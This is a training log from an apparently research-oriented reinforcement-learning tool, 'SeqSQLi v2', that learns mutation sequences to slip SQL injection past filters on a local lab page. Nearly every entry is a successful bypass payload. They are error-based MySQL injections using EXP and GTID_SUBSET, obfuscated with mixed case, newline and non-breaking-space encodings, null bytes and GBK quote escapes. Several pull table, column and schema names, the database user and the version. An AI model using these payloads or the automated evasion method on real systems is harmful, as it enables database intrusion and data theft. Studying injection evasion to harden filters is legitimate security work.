/home/neet/.pyenv/versions/3.13.12/lib/python3.13/site-packages/stable_baselines3/common/on_policy_algorithm.py:150: UserWarning: You are trying to run A2C on the GPU, but it is primarily intended to run on the CPU when not using a CNN policy (you are using ActorCriticPolicy which should be a MlpPolicy). See https://github.com/DLR-RM/stable-baselines3/issues/1245 for more info. You can pass `device='cpu'` or `export CUDA_VISIBLE_DEVICES=` to force using the CPU.Note: The model will train, but the GPU utilization will be poor and the training might take longer than on CPU.
  warnings.warn(
============================================================
 SeqSQLi v2 — A2C Training
 URL         : http://localhost:8080/Less-1/
 Filter type : none
 Mode        : online-WAF (dual-signal: union+error)
 Payload pool: 108 validated from payloads_error_less1.csv
               (union=0, error=108)
 Timesteps   : 150000
 Rollout     : n_steps=5 (synchronous A3C variant)
 Seed        : 3
============================================================
  Ep   10 | SR=0% | Steps=15.0 | R=-46.00
  [BYPASS] Ep 2036 | steps=8 | seq=case -> null_byte -> func_sp_nbsp -> agg_swap -> case -> null_byte -> case -> formfeed
           payload: 1'%0cand%0cEXP(~(SELEcT%0c*%0cFRoM%0c(SELEcT%0c((SelEcT%0cJSON_ARRAYAGG(taBLE_name)%0cfRom%0ciNfORmaTIOn_SCHemA.taBles%0cWHere%0ctABLE_schema=dataBASE
  Ep 2040 | SR=10% | Steps=14.3 | R=-35.75
  [BYPASS] Ep 2043 | steps=10 | seq=hex_to_char -> func_sp_nbsp -> func_sp_nbsp -> case -> case -> func_sp_nbsp -> null_byte -> case -> newline -> agg_swap
           payload: 1'%0aaNd%0aEXP(~(seLect%0a*%0aFROM%0a(SELecT%0a((sELecT%0aJSON_ARRAYAGG(CONCAT(TABlE_schema,CHAR(46),TaBlE_name))%0aFRom%0aInFORmAtION_scheMa.TAblEs%0
  [BYPASS] Ep 2049 | steps=13 | seq=null_byte -> hex_to_char -> case -> hex_to_char -> case -> func_sp_nbsp -> func_sp_nbsp -> case -> hash_nl -> null_byte -> case -> null_byte -> newline
           payload: 1'%0aaNd%0aGTID_SUBSET((version%a0()),1);%00
  Ep 2050 | SR=20% | Steps=14.3 | R=-35.67
  [BYPASS] Ep 2055 | steps=12 | seq=crlf -> case -> case -> case -> case -> null_byte -> agg_swap -> null_byte -> vtab -> case -> null_byte -> func_sp_nbsp
           payload: 1'%0d%0aAnd%0d%0aGTID_SUBSET((dATABAse%a0()),1);%00
  [BYPASS] Ep 2060 | steps=9 | seq=case -> case -> case -> case -> func_sp_nbsp -> case -> case -> crlf -> null_byte
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SElECt%0d%0a*%0d%0afrOm%0d%0a(selecT%0d%0a(version%a0()))a));%00
  Ep 2060 | SR=20% | Steps=14.1 | R=-33.55
  Ep 2070 | SR=0% | Steps=15.0 | R=-38.19
  [BYPASS] Ep 2075 | steps=10 | seq=newline -> case -> case -> case -> func_sp_nbsp -> case -> case -> hex_to_char -> case -> null_byte
           payload: 1'%0aaNd%0aGTID_SUBSET((version%a0()),1);%00
  Ep 2080 | SR=10% | Steps=14.5 | R=-35.67
  Ep 2090 | SR=0% | Steps=15.0 | R=-37.86
  Ep 2100 | SR=0% | Steps=15.0 | R=-37.30
  Ep 2110 | SR=0% | Steps=15.0 | R=-37.92
  [BYPASS] Ep 2120 | steps=9 | seq=case -> case -> agg_swap -> case -> agg_swap -> case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SElect%0a*%0afrom%0a(seLEct%0a(dAtabASe%a0()))a));%00
  Ep 2120 | SR=10% | Steps=14.4 | R=-35.97
  Ep 2130 | SR=0% | Steps=15.0 | R=-38.73
  [BYPASS] Ep 2131 | steps=14 | seq=agg_swap -> case -> case -> case -> case -> func_sp_nbsp -> between_space -> case -> case -> agg_swap -> case -> case -> crlf -> null_byte
           payload: 1'%0d%0aanD%0d%0aEXP(~(sELeCt%0d%0a*%0d%0aFrom%0d%0a(sElECt%0d%0a((sElEcT%0d%0aJSON_ARRAYAGG(column_name)%0d%0aFrOM%0d%0aiNfoRMaTioN_ScHEMA.columns%0d
  Ep 2140 | SR=10% | Steps=14.9 | R=-37.18
  [BYPASS] Ep 2148 | steps=3 | seq=newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((database%a0()),1);%00  *** NEW SHORTEST ***
  Ep 2150 | SR=10% | Steps=13.8 | R=-34.02
  Ep 2160 | SR=0% | Steps=15.0 | R=-39.40
  Ep 2170 | SR=0% | Steps=15.0 | R=-38.73
  Ep 2180 | SR=0% | Steps=15.0 | R=-37.49
  Ep 2190 | SR=0% | Steps=15.0 | R=-38.41
  [BYPASS] Ep 2192 | steps=8 | seq=null_byte -> agg_swap -> case -> dbl_url_comment -> gbk_bypass -> case -> func_sp_nbsp -> newline
           payload: 1%bf%27%0aAND%0aEXP(~(seLecT%0a*%0aFROM%0a(seLEcT%0a((selEct%0aJSON_ARRAYAGG(TAblE_name)%0afrom%0aiNForMaTiOn_sCHEMA.TAbLEs%0awHerE%0atAble_schema=DAt
  [BYPASS] Ep 2198 | steps=8 | seq=null_byte -> case -> newline -> agg_swap -> crlf -> agg_swap -> case -> func_sp_nbsp
           payload: 1'%0aand%0aGTID_SUBSET((user%a0()),1);%00
  Ep 2200 | SR=20% | Steps=13.6 | R=-31.91
  [BYPASS] Ep 2202 | steps=12 | seq=newline -> case -> null_byte -> agg_swap -> case -> case -> url_mid_char -> null_byte -> agg_swap -> case -> hex_to_char -> func_sp_nbsp
           payload: 1'%0aaND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 2209 | steps=5 | seq=agg_swap -> func_sp_nbsp -> null_byte -> case -> crlf
           payload: 1'%0d%0aanD%0d%0aEXP(~(seLeCt%0d%0a*%0d%0aFRoM%0d%0a(SelEcT%0d%0a((sELeCt%0d%0aJSON_ARRAYAGG(column_name)%0d%0afroM%0d%0ainfOrmaTiOn_scHEma.columns%0d
  [BYPASS] Ep 2210 | steps=9 | seq=case -> case -> crlf -> case -> case -> case -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0d%0aanD%0d%0aGTID_SUBSET((user%a0()),1);%00
  Ep 2210 | SR=30% | Steps=13.1 | R=-29.55
  [BYPASS] Ep 2211 | steps=14 | seq=func_sp_nbsp -> case -> null_byte -> case -> case -> case -> null_byte -> case -> case -> null_byte -> null_byte -> case -> case -> newline
           payload: 1'%0aAND%0aGTID_SUBSET((DaTaBASE%a0()),1);%00
  [BYPASS] Ep 2217 | steps=5 | seq=case -> newline -> func_sp_nbsp -> func_sp_nbsp -> null_byte
           payload: 1'%0aANd%0aGTID_SUBSET((DATAbASe%a0()),1);%00
  Ep 2220 | SR=20% | Steps=13.9 | R=-34.36
  [BYPASS] Ep 2221 | steps=13 | seq=case -> func_sp_nbsp -> case -> case -> case -> func_sp_nbsp -> func_sp_nbsp -> case -> case -> agg_swap -> case -> newline -> null_byte
           payload: 1'%0aand%0aEXP(~(SElect%0a*%0aFROM%0a(selEct%0a(version%a0()))a));%00
  [BYPASS] Ep 2227 | steps=7 | seq=case -> case -> newline -> case -> null_byte -> case -> agg_swap
           payload: 1'%0aaNd%0aEXP(~(SelEcT%0a*%0aFroM%0a(SeleCT%0a((SeleCT%0aJSON_ARRAYAGG(schema_name)%0afRom%0aINFoRMAtIOn_SCheMa.schemata)))a));%00
  Ep 2230 | SR=20% | Steps=14.0 | R=-32.03
  Ep 2240 | SR=0% | Steps=15.0 | R=-39.17
  [BYPASS] Ep 2241 | steps=11 | seq=newline -> func_sp_nbsp -> case -> func_sp_nbsp -> case -> case -> case -> case -> case -> case -> null_byte
           payload: 1'%0aAnd%0aEXP(~(SeLect%0a*%0aFrom%0a(seLect%0a(user%a0()))a));%00
  [BYPASS] Ep 2246 | steps=11 | seq=case -> case -> vtab -> case -> crlf -> case -> dot_prefix -> newline -> null_byte -> case -> func_sp_nbsp
           payload: .11'%0baNd%0bGTID_SUBSET((version%a0()),1);%00
  Ep 2250 | SR=20% | Steps=14.2 | R=-33.25
  [BYPASS] Ep 2259 | steps=3 | seq=null_byte -> crlf -> func_sp_nbsp
           payload: 1'%0d%0aAND%0d%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 2260 | steps=8 | seq=case -> crlf -> null_byte -> agg_swap -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAnD%0d%0aEXP(~(sELEct%0d%0a*%0d%0aFrOM%0d%0a(seLecT%0d%0a((sELecT%0d%0aJSON_ARRAYAGG(column_name)%0d%0aFRom%0d%0aINfORMAtion_schemA.columns%0d
  Ep 2260 | SR=20% | Steps=13.1 | R=-30.03
  [BYPASS] Ep 2261 | steps=8 | seq=func_sp_nbsp -> case -> agg_swap -> crlf -> case -> case -> case -> null_byte
           payload: 1'%0d%0aAnD%0d%0aEXP(~(SElect%0d%0a*%0d%0afroM%0d%0a(SelecT%0d%0a(DAtaBaSe%a0()))a));%00
  [BYPASS] Ep 2266 | steps=7 | seq=agg_swap -> case -> crlf -> case -> func_sp_nbsp -> case -> null_byte
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SeLeCt%0d%0a*%0d%0afrom%0d%0a(SELECt%0d%0a(DATAbASe%a0()))a));%00
  [BYPASS] Ep 2269 | steps=15 | seq=case -> case -> case -> null_byte -> crlf -> null_byte -> case -> null_byte -> case -> case -> hex_to_char -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aAnd%0d%0aGTID_SUBSET((user%a0()),1);%00
  Ep 2270 | SR=30% | Steps=13.5 | R=-29.20
  [BYPASS] Ep 2273 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sELEct%0a*%0aFRom%0a(seLECT%0a(user%a0()))a));%00
  [BYPASS] Ep 2276 | steps=14 | seq=case -> case -> crlf -> case -> case -> null_byte -> case -> case -> case -> null_byte -> null_byte -> agg_swap -> case -> func_sp_nbsp
           payload: 1'%0d%0aaNd%0d%0aEXP(~(seLECT%0d%0a*%0d%0aFrOM%0d%0a(SeLECT%0d%0a((SelEct%0d%0aJSON_ARRAYAGG(TABLe_name)%0d%0aFROM%0d%0ainfORMAtiOn_SChema.TaBLes%0d%0
  Ep 2280 | SR=20% | Steps=13.8 | R=-31.51
  Ep 2290 | SR=0% | Steps=15.0 | R=-37.34
  [BYPASS] Ep 2297 | steps=12 | seq=case -> null_byte -> case -> case -> agg_swap -> case -> case -> between_space -> case -> newline -> case -> func_sp_nbsp
           payload: 1'%a0anD%a0EXP(~(SelECT%a0*%a0from%a0(SElEcT%a0(DaTabASE%a0()))a));%00
  Ep 2300 | SR=10% | Steps=14.7 | R=-35.72
  [BYPASS] Ep 2302 | steps=15 | seq=null_byte -> hex_to_char -> newline -> agg_swap -> null_byte -> crlf -> case -> null_byte -> case -> hash_nl_all -> case -> case -> null_byte -> crlf -> func_sp_nbsp
           payload: 1'%0aand%0aGTID_SUBSET((DatABaSE%a0()),1);%00
  Ep 2310 | SR=10% | Steps=15.0 | R=-38.22
  Ep 2320 | SR=0% | Steps=15.0 | R=-37.29
  [BYPASS] Ep 2328 | steps=11 | seq=case -> case -> null_byte -> distinct -> case -> null_byte -> case -> null_byte -> crlf -> null_byte -> func_sp_nbsp
           payload: 1'%0d%0aAnd%0d%0aGTID_SUBSET((DATABase%a0()),1);%00
  Ep 2330 | SR=10% | Steps=14.6 | R=-35.71
  [BYPASS] Ep 2334 | steps=15 | seq=case -> case -> case -> case -> case -> case -> case -> case -> null_byte -> case -> between_space -> case -> newline -> crlf -> func_sp_nbsp
           payload: 1'%a0aNd%a0GTID_SUBSET((user%a0()),1);%00
  Ep 2340 | SR=10% | Steps=15.0 | R=-35.50
  [BYPASS] Ep 2346 | steps=10 | seq=null_byte -> case -> null_byte -> case -> case -> case -> case -> newline -> case -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(sELEct%0a*%0aFROM%0a(SELeCT%0a(daTabaSe%a0()))a));%00
  Ep 2350 | SR=10% | Steps=14.5 | R=-35.05
  [BYPASS] Ep 2354 | steps=11 | seq=null_byte -> case -> hex_to_char -> newline -> case -> case -> newline -> case -> case -> case -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(seLect%0a*%0aFROm%0a(selECT%0a((SelEcT%0aJSON_ARRAYAGG(CONCAT(table_schema,CHAR(46),TaBLE_name))%0aFRom%0ainfOrmATion_sChema.taBLes%0
  Ep 2360 | SR=10% | Steps=14.6 | R=-36.51
  [BYPASS] Ep 2367 | steps=10 | seq=crlf -> between_space -> newline -> between_space -> case -> case -> case -> agg_swap -> nested_or -> null_byte
           payload: 1'%0d%0aanD%0d%0aEXP(~(SelECT%0d%0a*%0d%0afRoM%0d%0a(selecT%0d%0a((SELECt%0d%0aJSON_ARRAYAGG(schema_name)%0d%0aFROM%0d%0aINfORMATIOn_SChEmA.schemata))
  Ep 2370 | SR=10% | Steps=14.5 | R=-35.40
  [BYPASS] Ep 2372 | steps=12 | seq=case -> case -> case -> case -> case -> case -> case -> crlf -> func_sp_nbsp -> case -> func_sp_nbsp -> null_byte
           payload: 1'%0d%0aaNd%0d%0aEXP(~(SEleCT%0d%0a*%0d%0aFrOM%0d%0a(SeLEct%0d%0a(dAtAbASE%a0()))a));%00
  [BYPASS] Ep 2379 | steps=8 | seq=case -> case -> case -> case -> null_byte -> func_sp_nbsp -> case -> newline
           payload: 1'%0aAnd%0aEXP(~(SELEcT%0a*%0aFrOM%0a(SElECT%0a(version%a0()))a));%00
  Ep 2380 | SR=20% | Steps=14.0 | R=-32.79
  Ep 2390 | SR=0% | Steps=15.0 | R=-37.32
  [BYPASS] Ep 2392 | steps=15 | seq=agg_swap -> case -> hex_to_char -> null_byte -> case -> case -> case -> null_byte -> case -> newline -> null_byte -> case -> null_byte -> agg_swap -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(seleCT%0a*%0afROm%0a(SelEct%0a((SelEct%0aconCAt(CHAR(124),JSON_ARRAYAGG(TABLE_name),CHAR(124))%0aFrom%0aInforMaTIOn_ScheMA.TABLEs%0aW
  [BYPASS] Ep 2397 | steps=9 | seq=hex_to_char -> case -> agg_swap -> case -> case -> newline -> case -> case -> null_byte
           payload: 1'%0aANd%0aEXP(~(SElecT%0a*%0afRoM%0a(seLeCt%0a((SELeCT%0aJSON_ARRAYAGG(CoNCaT(TABle_schema,CHAR(46),TaBLe_name))%0aFRoM%0ainFormAtioN_ScHEMa.TABlEs%0
  Ep 2400 | SR=20% | Steps=14.4 | R=-36.38
  [BYPASS] Ep 2406 | steps=10 | seq=hex_to_char -> agg_swap -> newline -> case -> between_space -> case -> null_byte -> case -> null_byte -> func_sp_nbsp
           payload: 1'%0aaND%0aEXP(~(seleCt%0a*%0afrOM%0a(SELeCT%0a((sElect%0aconcAT(CHAR(124),JSON_ARRAYAGG(tabLE_name),CHAR(124))%0afROM%0aINFOrMAtIoN_scheMa.taBLes%0aw
  [BYPASS] Ep 2407 | steps=4 | seq=case -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aANd%0aGTID_SUBSET((DAtABAsE%a0()),1);%00
  Ep 2410 | SR=20% | Steps=13.4 | R=-32.44
  [BYPASS] Ep 2417 | steps=14 | seq=null_byte -> null_byte -> newline -> null_byte -> agg_swap -> null_byte -> case -> null_byte -> agg_swap -> null_byte -> case -> null_byte -> hash_nl_all -> func_sp_nbsp
           payload: 1'%0aAnd%0aGTID_SUBSET((version%a0()),1);%00
  Ep 2420 | SR=10% | Steps=14.9 | R=-39.47
  [BYPASS] Ep 2424 | steps=8 | seq=case -> null_byte -> null_byte -> case -> crlf -> case -> case -> func_sp_nbsp
           payload: 1'%0d%0aand%0d%0aEXP(~(selEct%0d%0a*%0d%0aFROM%0d%0a(SeLeCT%0d%0a(version%a0()))a));%00
  [BYPASS] Ep 2426 | steps=9 | seq=null_byte -> case -> nested_or -> null_byte -> newline -> null_byte -> case -> null_byte -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(seLECt%0a*%0aFrOM%0a(sElECt%0a((sElecT%0aJSON_ARRAYAGG(schema_name)%0aFrOm%0aiNForMAtion_ScHemA.schemata)))a));%00
  Ep 2430 | SR=20% | Steps=13.7 | R=-34.28
  Ep 2440 | SR=0% | Steps=15.0 | R=-40.20
  [BYPASS] Ep 2443 | steps=6 | seq=null_byte -> newline -> null_byte -> func_sp_nbsp -> null_byte -> case
           payload: 1'%0aaNd%0aEXP(~(sElect%0a*%0afroM%0a(sELECT%0a(daTaBasE%a0()))a));%00
  Ep 2450 | SR=10% | Steps=14.1 | R=-36.89
  [BYPASS] Ep 2456 | steps=6 | seq=case -> newline -> case -> null_byte -> agg_swap -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((DaTaBAse%a0()),1);%00
  [BYPASS] Ep 2460 | steps=7 | seq=null_byte -> newline -> newline -> func_sp_nbsp -> case -> null_byte -> agg_swap
           payload: 1'%0aAnD%0aEXP(~(selEct%0a*%0aFROm%0a(sELEct%0a((SELeCt%0aJSON_ARRAYAGG(TAbLE_name)%0aFRoM%0aInfORMaTIon_SChEMA.TABles%0aWherE%0atAble_schema=dAtAbaSe
  Ep 2460 | SR=20% | Steps=13.3 | R=-32.44
  [BYPASS] Ep 2470 | steps=12 | seq=hex_to_char -> between_space -> case -> case -> agg_swap -> newline -> func_sp_nbsp -> agg_swap -> case -> case -> agg_swap -> null_byte
           payload: 1'%a0and%a0EXP(~(SeLEct%a0*%a0from%a0(SeLecT%a0((SelECT%a0JSON_ARRAYAGG(cOncAt(TaBle_schema,CHAR(46),tAbLe_name))%a0fRoM%a0iNfOrmAtIOn_sCHEma.TABLes%a
  Ep 2470 | SR=10% | Steps=14.7 | R=-37.99
  [BYPASS] Ep 2471 | steps=9 | seq=case -> case -> null_byte -> newline -> func_sp_tab -> case -> between_space -> func_sp_nbsp -> agg_swap
           payload: 1'%0aANd%0aEXP(~(sELEcT%0a*%0aFRoM%0a(sELect%0a((SelECt%0aJSON_ARRAYAGG(schema_name)%0aFrOm%0aInFORMatiOn_SCHEmA.schemata)))a));%00
  [BYPASS] Ep 2476 | steps=5 | seq=null_byte -> newline -> null_byte -> func_sp_nbsp -> case
           payload: 1'%0aAnd%0aEXP(~(sELect%0a*%0afRom%0a(seLeCt%0a(user%a0()))a));%00
  Ep 2480 | SR=20% | Steps=13.4 | R=-31.82
  [BYPASS] Ep 2487 | steps=10 | seq=null_byte -> ver_50000 -> newline -> null_byte -> case -> null_byte -> case -> char_split -> gbk_bypass -> func_sp_nbsp
           payload: 1%bf%27%0aAnd%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 2489 | steps=11 | seq=newline -> case -> agg_swap -> func_sp_nbsp -> case -> case -> case -> gbk_bypass -> case -> func_sp_nbsp -> null_byte
           payload: 1%bf%27%0aaND%0aEXP(~(selECt%0a*%0afRom%0a(sELECT%0a((sELEct%0aJSON_ARRAYAGG(column_name)%0aFroM%0ainFOrMATiOn_scHemA.columns%0aWherE%0aTaBle_schema=d
  Ep 2490 | SR=20% | Steps=14.1 | R=-33.35
  Ep 2500 | SR=0% | Steps=15.0 | R=-38.87
  [BYPASS] Ep 2510 | steps=13 | seq=case -> case -> newline -> case -> func_sp_nbsp -> tab_space -> func_sp_nbsp -> case -> case -> between_space -> case -> newline -> null_byte
           payload: 1'%0aanD%0aGTID_SUBSET((version%a0()),1);%00
  Ep 2510 | SR=10% | Steps=14.8 | R=-37.08
  Ep 2520 | SR=0% | Steps=15.0 | R=-37.74
  [BYPASS] Ep 2522 | steps=8 | seq=hex_to_char -> between_space -> null_byte -> nested_and -> case -> case -> case -> agg_swap
           payload: 1'%a0AND%a0EXP(~(SeLeCt%a0*%a0FRom%a0(selEct%a0((sElECt%a0JSON_ARRAYAGG(CONCAT(TaBLE_schema,CHAR(46),TABLE_name))%a0FRom%a0inForMatIoN_sCHEma.taBLes%a
  [BYPASS] Ep 2525 | steps=9 | seq=case -> case -> case -> case -> agg_swap -> case -> null_byte -> ident_backtick -> between_space
           payload: 1'%a0aND%a0EXP(~(selECT%a0*%a0From%a0(seLECt%a0((SElECT%a0JSON_ARRAYAGG(schema_name)%a0FROM%a0`iNFoRMaTIoN_sCHema`.`schemata`)))a));%00
  Ep 2530 | SR=20% | Steps=13.7 | R=-30.43
  Ep 2540 | SR=0% | Steps=15.0 | R=-37.07
  [BYPASS] Ep 2544 | steps=12 | seq=case -> case -> null_byte -> newline -> case -> null_byte -> case -> null_byte -> case -> case -> null_byte -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 2550 | steps=15 | seq=hex_to_char -> agg_swap -> case -> case -> case -> case -> case -> case -> case -> case -> case -> case -> case -> newline -> null_byte
           payload: 1'%0aaNd%0aEXP(~(sEleCt%0a*%0afRoM%0a(SElECt%0a((sElEct%0aJSON_ARRAYAGG(CoNcAT(taBlE_schema,CHAR(46),taBle_name))%0afROM%0aINFORmATion_sCHEmA.taBles%0
  Ep 2550 | SR=20% | Steps=14.7 | R=-33.05
  [BYPASS] Ep 2553 | steps=15 | seq=case -> agg_swap -> case -> case -> null_byte -> case -> case -> case -> null_byte -> case -> hash_nl -> null_byte -> case -> newline -> func_sp_nbsp
           payload: 1'%0aAND%0aEXP(~(sEleCt%0a*%0afroM%0a(SeLECt%0a(user%a0()))a));%00
  Ep 2560 | SR=10% | Steps=15.0 | R=-35.72
  Ep 2570 | SR=0% | Steps=15.0 | R=-37.57
  [BYPASS] Ep 2578 | steps=10 | seq=case -> newline -> case -> case -> null_byte -> case -> case -> case -> null_byte -> func_sp_nbsp
           payload: 1'%0aanD%0aGTID_SUBSET((version%a0()),1);%00
  Ep 2580 | SR=10% | Steps=14.5 | R=-34.00
  Ep 2590 | SR=0% | Steps=15.0 | R=-37.90
  Ep 2600 | SR=0% | Steps=15.0 | R=-37.20
  [BYPASS] Ep 2601 | steps=4 | seq=null_byte -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  Ep 2610 | SR=10% | Steps=13.9 | R=-33.75
  [BYPASS] Ep 2614 | steps=3 | seq=newline -> func_sp_nbsp -> null_byte
           payload: 1'%0aAND%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 2617 | steps=13 | seq=case -> case -> case -> null_byte -> newline -> case -> case -> null_byte -> agg_swap -> newline -> case -> nested_and -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(SELECt%0a*%0afrOm%0a(SeleCT%0a(version%a0()))a));%00
  [BYPASS] Ep 2619 | steps=9 | seq=case -> case -> agg_swap -> between_space -> null_byte -> case -> null_byte -> case -> func_sp_nbsp
           payload: 1'%a0aND%a0EXP(~(sElEcT%a0*%a0fROM%a0(selecT%a0(user%a0()))a));%00
  Ep 2620 | SR=30% | Steps=13.0 | R=-28.86
  Ep 2630 | SR=0% | Steps=15.0 | R=-38.21
  [BYPASS] Ep 2636 | steps=13 | seq=null_byte -> between_space -> null_byte -> ident_backtick -> case -> null_byte -> case -> case -> newline -> hex_to_char -> newline -> case -> func_sp_nbsp
           payload: 1'%a0aNd%a0GTID_SUBSET((DaTAbAsE%a0()),1);%00
  Ep 2640 | SR=10% | Steps=14.8 | R=-37.06
  [BYPASS] Ep 2646 | steps=5 | seq=case -> case -> newline -> null_byte -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SElecT%0a*%0afROm%0a(SELeCt%0a(dATABASE%a0()))a));%00
  [BYPASS] Ep 2647 | steps=15 | seq=newline -> func_sp_nbsp -> case -> case -> gbk_bypass -> case -> case -> case -> case -> case -> case -> case -> newline -> case -> null_byte
           payload: 1%bf%27%0aand%0aGTID_SUBSET((version%a0()),1);%00
  [BYPASS] Ep 2648 | steps=11 | seq=newline -> case -> case -> case -> case -> null_byte -> case -> between_space -> null_byte -> newline -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(selECt%0a*%0aFrOM%0a(seLecT%0a(dAtAbAsE%a0()))a));%00
  Ep 2650 | SR=30% | Steps=13.6 | R=-29.74
  [BYPASS] Ep 2651 | steps=8 | seq=case -> null_byte -> case -> case -> func_sp_nbsp -> case -> case -> newline
           payload: 1'%0aanD%0aGTID_SUBSET((dATaBAsE%a0()),1);%00
  Ep 2660 | SR=10% | Steps=14.3 | R=-35.57
  [BYPASS] Ep 2661 | steps=6 | seq=case -> func_sp_nbsp -> null_byte -> case -> agg_swap -> newline
           payload: 1'%0aANd%0aEXP(~(selecT%0a*%0afROm%0a(sELect%0a(version%a0()))a));%00
  Ep 2670 | SR=10% | Steps=14.1 | R=-33.50
  [BYPASS] Ep 2676 | steps=10 | seq=func_sp_nbsp -> agg_swap -> case -> case -> double_or -> case -> func_sp_nbsp -> null_byte -> case -> newline
           payload: 1'%0aaNd%0aEXP(~(sELeCT%0a*%0aFrOm%0a(seLecT%0a((SeLect%0aJSON_ARRAYAGG(schema_name)%0aFRoM%0ainFoRMAtiOn_scHeMA.schemata)))a));%00
  Ep 2680 | SR=10% | Steps=14.5 | R=-34.59
  [BYPASS] Ep 2685 | steps=10 | seq=newline -> case -> case -> case -> agg_swap -> null_byte -> null_byte -> case -> case -> func_sp_nbsp
           payload: 1'%0aAnD%0aEXP(~(SELeCt%0a*%0afrOM%0a(SELeCt%0a((sELEcT%0aJSON_ARRAYAGG(column_name)%0aFrOM%0ainFoRMATiOn_sChemA.columns%0aWhErE%0atAbLe_schema=dATaBa
  Ep 2690 | SR=10% | Steps=14.5 | R=-34.35
  Ep 2700 | SR=0% | Steps=15.0 | R=-37.44
  [BYPASS] Ep 2704 | steps=15 | seq=case -> case -> case -> case -> case -> case -> null_byte -> case -> between_space -> func_sp_nbsp -> case -> case -> case -> null_byte -> agg_swap
           payload: 1'%a0And%a0EXP(~(SeLecT%a0*%a0frOm%a0(sElECT%a0((sELEct%a0JSON_ARRAYAGG(tAbLE_name)%a0FRoM%a0informatIOn_sCHEma.tABLEs%a0whErE%a0TABlE_schema=DatABaSE
  Ep 2710 | SR=10% | Steps=15.0 | R=-36.84
  [BYPASS] Ep 2718 | steps=6 | seq=case -> func_sp_nbsp -> null_byte -> case -> null_byte -> newline
           payload: 1'%0aaND%0aGTID_SUBSET((user%a0()),1);%00
  Ep 2720 | SR=10% | Steps=14.1 | R=-33.91
  [BYPASS] Ep 2725 | steps=12 | seq=case -> case -> hex_to_char -> case -> newline -> case -> case -> func_sp_nbsp -> null_byte -> case -> case -> agg_swap
           payload: 1'%0aANd%0aEXP(~(SeLEcT%0a*%0afROm%0a(SeLeCt%0a((SElEcT%0aJSON_ARRAYAGG(CONCAT(tABLE_schema,CHAR(46),TABle_name))%0afROm%0aInFOrmATIOn_ScHEmA.TAbLEs%0
  [BYPASS] Ep 2727 | steps=9 | seq=agg_swap -> null_byte -> newline -> case -> null_byte -> case -> case -> case -> func_sp_nbsp
           payload: 1'%0aaNd%0aEXP(~(sEleCT%0a*%0afrom%0a(seLeCT%0a((SEleCt%0aJSON_ARRAYAGG(column_name)%0afroM%0ainFOrmATiOn_sChEma.columns%0awHErE%0ataBLe_schema=DATAba
  Ep 2730 | SR=20% | Steps=14.1 | R=-31.64
  [BYPASS] Ep 2731 | steps=8 | seq=case -> newline -> func_sp_nbsp -> case -> hash_nl_all -> case -> case -> null_byte
           payload: 1'%0aanD%0aGTID_SUBSET((user%a0()),1);%00
  [BYPASS] Ep 2734 | steps=14 | seq=case -> case -> case -> between_space -> newline -> case -> case -> case -> case -> null_byte -> newline -> case -> newline -> func_sp_nbsp
           payload: 1'%a0aNd%a0EXP(~(SEleCt%a0*%a0FROm%a0(selECt%a0(user%a0()))a));%00
